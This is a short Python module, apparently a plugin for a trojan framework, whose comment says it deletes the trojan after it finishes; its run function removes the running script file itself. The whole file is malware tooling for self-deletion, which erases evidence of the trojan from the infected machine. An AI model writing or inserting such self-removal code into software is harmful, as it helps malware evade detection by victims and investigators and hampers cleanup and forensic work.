#delself.py deletes the trojan after it finishes

import os
import sys

def run(**args):
    os.remove(sys.argv[0])
    return None